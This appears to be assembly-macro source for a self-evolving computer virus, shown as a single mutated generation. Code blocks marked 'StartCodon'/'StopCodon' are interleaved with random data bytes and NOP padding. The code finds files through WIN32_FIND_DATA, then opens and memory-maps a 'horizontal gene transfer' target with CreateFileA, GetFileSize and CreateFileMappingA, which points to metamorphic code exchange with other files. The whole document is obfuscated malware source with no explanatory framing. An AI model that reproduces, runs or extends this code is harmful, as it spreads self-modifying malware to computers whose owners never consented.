db 134
db 35
db 17
db 159
db 83
db 15
db 128
db 84
db 147
db 56
db 249
db 199
db 0
db 93
db 99
db 47
db 86
db 206
db 61
db 177
db 146
db 7
db 31
db 3
db 219
db 222
db 188
db 109
db 202
db 221
db 107
db 36
db 247
db StartCodon
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
               _push
db StopCodon
db 119
db 150
db 198
db 172
db 13
db 183
db 229
db 244
db 83
db 131
db 0
db 174
db 63
db 69
db 16
db 15
db 22
db 55
db 162
db 206
db 28
db 175
db 166
db 48
db 255
db 181
db 44
db 66
db 135
db 224
db 34
db 192
db 47
db 47
db 162
db 175
db 106
db 175
db 169
db StartCodon
               _push
    BigNum=3
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 112
db 47
db 47
db 151
db 1
db 116
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 47
db 147
db 75
db 71
db 72
db 5
db 48
db 28
db 83
db 190
db 88
db 128
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 252
db 69
db 13
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _push
db StopCodon
db 168
db 74
db 37
db 54
db 145
db 39
db 241
db 44
db 56
db 210
db 196
db StartCodon
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
               _push
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 114
db 163
db 80
db 211
db 80
db 149
db 43
db 21
db 95
db 10
db 160
db 108
db 199
db 195
db 191
db 53
db 193
db 74
db 66
db 188
db 148
db 53
db 80
db 20
db 90
db 142
db 37
db 7
db 74
db 224
db 201
db 158
db 123
db 146
db 155
db 110
db 112
db 97
db 146
db 101
db 222
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _push
               _sub0001
db StopCodon
db 13
db 81
db 107
db 13
db 68
db 193
db 63
db 72
db 77
db 17
db 76
db 95
db 20
db 72
db 67
db 189
db 117
db 247
db 2
db 164
db 175
db 223
db 147
db 195
db 86
db 176
db 70
db 146
db 128
db 18
db 231
db 167
db 50
db 43
db 144
db 153
db 156
db 76
db 63
db 236
db 189
db 151
db 97
db 71
db 131
db 107
db 209
db 5
db 28
db 255
db 94
db 230
db 109
db 231
db 54
db 142
db 71
db 210
db 198
db 26
db 78
db 16
db StartCodon
    BigNum=0xC0000000
    AlreadyStarted=0
    if BigNum<25
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 16
db 251
db 61
db 212
db 160
db 12
db 141
db 100
db 211
db 216
db 10
db 89
db 194
db 5
db 57
db 21
db 116
db 248
db 110
db 148
db 232
db 230
db 154
db 91
db StartCodon
        _save
        _and
        _popall
    end if
               _push
    _getDO
    BigNum=WIN32_FIND_DATA_cFileName-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 230
db 0
db 28
db 119
db 176
db 175
db 136
db 118
db 215
db 212
db 196
db 196
db 234
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _push
    _getDO
db StopCodon
db 201
db 170
db 169
db 190
db 77
db 194
db 82
db 94
db 247
db StartCodon
    BigNum=hCreateFileA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 56
db 117
db 29
db 49
db 82
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 231
db 83
db 59
db 134
db 213
db 95
db 15
db 80
db 142
db 20
db 72
db 154
db 21
db 104
db 52
db 160
db 51
db 197
db 185
db 5
db 41
db 243
db 82
db 153
db 32
db 239
db 71
db 8
db 131
db 15
db 5
db 8
db 205
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 159
db 122
db 168
db 241
db 90
db 49
db 217
db 134
db 134
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
    _getDO
    BigNum=HGTFileHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _saveWrtOff
               _nopsA
               _writeDWord              ; mov dword[HGTFileHandle], RegA
               _save
               _nopsA
    BigNum=1
    AlreadyStarted=0
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    if BigNum<25
db StopCodon
db 153
db 26
db 18
db 40
db 254
db 109
db 196
db 41
db 220
db 60
db 10
db 133
db 60
db 63
db 2
db 111
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 172
db 157
db 22
db 131
db 93
db 64
db 201
db 117
db 114
db 6
db 130
db 250
db 186
db 147
db 95
db 78
db 166
db 103
db 49
db 181
db 109
db 199
db 96
db 41
db 55
db 136
db 233
db 32
db 96
db 183
db 186
db 114
db 180
db 109
db 246
db 38
db 95
db 211
db 35
db 59
db 97
db 17
db 203
db 251
db 201
db 232
db 247
db 188
db 50
db 222
db 226
db 50
db 222
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 249
db 79
db 49
db 130
db 136
db 182
db 95
db 42
db 73
db 56
db 168
db 133
db 35
db 93
db 164
db 159
db 164
db 39
db 55
db 221
db 110
db 150
db 84
db 11
db 2
db 36
db 70
db 95
db 11
db 130
db 52
db 105
db 89
db 93
db 198
db 116
db 10
db 88
db 72
db 124
db 8
db 250
db 248
db 88
db 195
db 222
db 0
db 148
db 133
db 56
db 71
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                                       ; -> if error: BC1=0
               _JnzDown                             ; Simulate a JzDown
                       _pop     ; BC1=0
                       _push
                       _call    ; If INVALID_HANDLE_VALUE -> Do not open...
                       _nopREAL
    _getDO
    BigNum=HGTFileSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 136
db 212
db 128
db 102
db 170
db 24
db 64
db 196
db 147
db 151
db 86
db 216
db 135
db 0
db 86
db 20
db 141
db 167
db 92
db 213
db 243
db 187
db 221
db 219
db 199
db 231
db 93
db 56
db 144
db 230
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _push
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
db StopCodon
db 19
db 86
db 87
db 174
db 155
db 227
db 202
db 176
db 42
db 212
db 245
db 48
db 248
db 192
db 27
db 110
db 29
db 252
db 103
db 22
db 1
db 227
db 2
db 105
db 208
db 235
db 144
db 246
db 56
db 71
db 5
db 90
db 63
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
               _addsaved
               _push
    _getDO
    BigNum=hGetFileSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 99
db 219
db 49
db 23
db 114
db 229
db 239
db 130
db 68
db 213
db 219
db 63
db 217
db 80
db 44
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 111
db 127
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
    _getDO
    BigNum=HGTFileSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 252
db 214
db 130
db 15
db 76
db 187
db 7
db 73
db 64
db 203
db 15
db 106
db 192
db 174
db 245
db 12
db 72
db 205
db 204
db 71
db 167
db 158
db 117
db 4
db 235
db 253
db 200
db 186
db 73
db 82
db 145
db 80
db 138
db 181
db 159
db 216
db 195
db 246
db 226
db 193
db 248
db 59
db 5
db 166
db 71
db 167
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _saveWrtOff
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
               _nopsA
               _writeDWord              ; mov dword[HGTFileSize], RegA
db StopCodon
db 10
db 69
db 221
db 156
db 165
db 147
db 12
db 73
db StartCodon
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
               _push
               _addsaved
               _push
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
               _push
    BigNum=4
    AlreadyStarted=0
db StopCodon
db 169
db 235
db 122
db 42
db 127
db 12
db 180
db 195
db 140
db 243
db 0
db 101
db 16
db 53
db 188
db 2
db 177
db 246
db 119
db 246
db 190
db 66
db 68
db 206
db 243
db 57
db 76
db 222
db 91
db 140
db 38
db 158
db 188
db 246
db 60
db 20
db 53
db 75
db 138
db 1
db 195
db 110
db 10
db 239
db 252
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _push
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
               _push
    _getDO
    BigNum=HGTFileHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _push
    _getDO
    BigNum=hCreateFileMappingA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 29
db 241
db 121
db 239
db 214
db 95
db 89
db 136
db 106
db 228
db 213
db 88
db 163
db 184
db 7
db 9
db 135
db 21
db 158
db 178
db 238
db 56
db 33
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
    _getDO
    BigNum=HGTMapHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 248
db 212
db 13
db 239
db 49
db 4
db 133
db 71
db 103
db 15
db 221
db 34
db 149
db 173
db 235
db 6
db 222
db 159
db 89
db 121
db 191
db 210
db 75
db 144
db 60
db 45
db 65
db 70
db 38
db 245
db 89
db 201
db 202
db 50
db 135
db 125
db 13
db 141
db 34
db 118
db 165
db 222
db 206
db 125
db 196
db 16
db 57
db 154
db 106
db 46
db 71
db 233
db 56
db 205
db 44
db 214
db 1
db 199
db 168
db 173
db 163
db 47
db 98
db 57
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 9
db 42
db 84
db 207
db 39
db 115
db 6
db 97
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 183
db 180
db 43
db 235
db 157
db 33
db 182
db 80
db 151
db 226
db 219
db 222
db 175
db 90
db 82
db 209
db 43
db 199
db 139
db 40
db 206
db 151
db 115
db 250
db 78
db 226
db 177
db 176
db 28
db 136
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _saveWrtOff
               _nopsA
               _writeDWord               ; mov dword[HGTMapHandle], RegA
               _save
               _nopsA
               _save
               _and
               _JnzDown                             ; Simulate a JzDown
                       _pop     ; BC1=0
                       _push
                       _call    ; If NULL -> Do not open...
                       _nopREAL
    _getDO
    BigNum=HGTFileSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _push   ; [HGTFileSize]
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
db StopCodon
db 99
db 185
db 156
db 103
db 58
db 14
db 247
db 170
db 233
db 130
db 182
db 2
db 20
db 130
db 67
db 99
db 222
db 127
db 148
db 40
db 170
db 228
db 0
db 254
db 61
db 182
db 70
db 94
db 47
db 95
db 115
db 23
db 133
db 189
db 2
db 184
db 26
db 182
db 58
db 118
db 87
db 209
db 140
db 235
db 249
